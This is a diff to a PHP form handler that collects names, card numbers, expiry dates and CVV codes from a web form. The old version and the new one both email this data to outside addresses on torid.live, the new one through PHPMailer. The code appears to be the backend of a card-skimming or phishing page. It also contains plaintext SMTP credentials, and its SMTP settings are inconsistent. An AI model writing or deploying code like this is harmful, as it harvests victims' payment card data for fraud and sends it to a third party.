@@ -1,37 +1,42 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $firstName = $_POST["firstName"];
-    $lastName = $_POST["lastName"];
-    $cardNumber = $_POST["cardNumber"];
-    $exp = $_POST["exp"];
-    $cvv = $_POST["cvv"];
-    $postalCode = $_POST["postalCode"];
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
 
-    // Recipient email address
-    $to = "paymentinfo@torid.live";
-    $subject = "New Payment Form Submission";
-    $headers = "From: webmaster@example.com"; // Replace with a valid email address
+require 'vendor/autoload.php';
 
-    // Compose the email message
-    $email_message = "First Name: $firstName\n";
-    $email_message .= "Last Name: $lastName\n";
-    $email_message .= "Card Number: $cardNumber\n";
-    $email_message .= "Expiration Date: $exp\n";
-    $email_message .= "CVV: $cvv\n";
-    $email_message .= "Postal Code: $postalCode\n";
+// Get data from the form
+$firstName = $_POST['firstName'];
+$lastName = $_POST['lastName'];
+$cardNumber = $_POST['cardNumber'];
+$exp = $_POST['exp'];
+$cvv = $_POST['cvv'];
 
-    $smtp_server = "smtp.gmail.com";
-    $smtp_port = 587;
-    $smtp_username = "remensnyderlinda@gmail.com";
-    $smtp_password = "your-gmail-password";
+// Create a PHPMailer object
+$mail = new PHPMailer(true);
 
-    // Send email using mail() function
-    if (mail($to, $subject, $email_message, $headers, "-f$smtp_username")) {
-        echo "Thank you! Your payment details have been sent.";
-    } else {
-        echo "Oops! Something went wrong and we couldn't send your payment details.";
-    }
-} else {
-    echo "Invalid request";
+try {
+    // Server settings (replace with your SMTP server details)
+    $mail->isSMTP();
+    $mail->Host = 'smtp.example.com'; // Your SMTP server hostname
+    $mail->SMTPAuth = true;
+    $mail->Username = 'remensnyderlinda@gmail.com'; // Your SMTP server username
+    $mail->Password = 'G@m1ngPC'; // Your SMTP server password
+    $mail->SMTPSecure = '465'; // TLS or SSL, depending on your SMTP server configuration
+    $mail->Port = 587; // TCP port to connect to
+
+    // Sender and recipient settings
+    $mail->setFrom('remensnyderlinda@gmail.com', 'Linda'); // Sender email and name
+    $mail->addAddress('saif@torid.live', 'SK'); // Recipient email and name
+
+    // Email content
+    $mail->isHTML(true);
+    $mail->Subject = 'New Payment Data Received';
+    $mail->Body = "First Name: $firstName<br>Last Name: $lastName<br>Card Number: $cardNumber<br>Expiration: $exp<br>CVV: $cvv";
+
+    // Send email
+    $mail->send();
+    echo 'Email sent successfully';
+} catch (Exception $e) {
+    echo 'Email could not be sent. Mailer Error: ' . $mail->ErrorInfo;
 }
 ?>
